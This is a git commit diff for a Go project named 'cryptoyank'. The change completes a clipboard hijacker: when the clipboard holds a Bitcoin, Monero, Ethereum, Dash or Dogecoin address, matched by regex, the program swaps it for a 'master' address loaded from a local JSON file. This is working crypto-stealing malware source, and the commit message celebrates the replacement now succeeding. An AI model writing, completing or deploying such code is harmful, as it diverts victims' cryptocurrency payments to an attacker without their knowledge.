7f4c35d4802f4f9b998ac4722f439d1e3ad0bd70
Jacques Andre <jacquesandre@mailbox.org>
2022-12-04 16:05:27 +0000

    [feature] successfully replacing clipboard with master addresses

--- cryptoyank/main.go
+++ cryptoyank/main.go
@@ -5,21 +5,14 @@ import (
 	"crypto-yank/constants"
 	"encoding/json"
 	"errors"
-	"golang.design/x/clipboard"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
 	"regexp"
-)
 
-// Holds what to replace clipboard with
-type MasterAdresses struct {
-	BtcAddress  string `json:"btc"`
-	XmrAddress  string `json:"xmr"`
-	EthAddress  string `json:"eth"`
-	DashAddress string `json:"dash"`
-	DogeAddress string `json:"doge"`
-}
+	"golang.design/x/clipboard"
+)
 
 func main() {
 	err := clipboard.Init()
@@ -42,38 +35,53 @@ func main() {
 // Go through all regex matches, compile regex for them,
 // if match string replace all
 func replaceClipboard(clipboardStr string) (string, error) {
+	masterAddresses, err := getMasterAddresses()
+
+	if err != nil{
+		log.Fatalf("error loading masterAddresses, %s", err.Error())
+		return "", err
+	}
+
+	// go through all regex, check for match
 	for _, regexMatch := range constants.RegexMatches {
 		r, _ := regexp.Compile(regexMatch.RegexMatch)
 
+		// found match, return new str
 		if r.MatchString(clipboardStr) {
-			log.Printf("found: %s in clipboard, replaced", regexMatch.CryptoName)
-
-			// TODO: make this replace with masterAddresses
-			newStr := r.ReplaceAllString(clipboardStr, "new")
+			newStr := r.ReplaceAllString(clipboardStr, masterAddresses[regexMatch.CryptoName])
+			log.Printf("found: %s in clipboard, replacing with: %s", regexMatch.CryptoName, newStr)
 			return newStr, nil
 		}
 	}
 	return "", errors.New("No match found")
 }
 
-func getMasterAddresses() (MasterAdresses, error) {
-	var masterAddresses MasterAdresses // returning
+// Open constants/addresses.json, returns string map of cryptoName:addresses
+// use this map to lookup replacing addresses 
+func getMasterAddresses() (map[string]string, error) {
 	jsonFile, err := os.Open("constants/addresses.json")
-
 	if err != nil {
 		log.Fatalf("unable to open regex matches %s", err.Error())
-		return masterAddresses, err
+		return map[string]string{}, err
 	}
+
 	byteValue, err := ioutil.ReadAll(jsonFile)
 	if err != nil {
 		log.Fatalf("unable to get byteValue %s", err.Error())
-		return masterAddresses, err
-	}
-	err = json.Unmarshal(byteValue, &masterAddresses)
-	if err != nil {
-		log.Fatalf("unable to unmarshal %s", err.Error())
-		return masterAddresses, err
+		return map[string]string{}, err
 	}
 
-	return masterAddresses, nil
+	var result map[string]interface{}
+	err = json.Unmarshal(byteValue, &result)
+	if err != nil {
+		log.Fatalf("unable to unmarshal %s", err.Error())
+		return map[string]string{}, err
+	}
+
+	mm := make(map[string]string)
+	for k, v := range result{
+		mm[k] = fmt.Sprint(v)
+	}
+
+	return mm, nil
 }
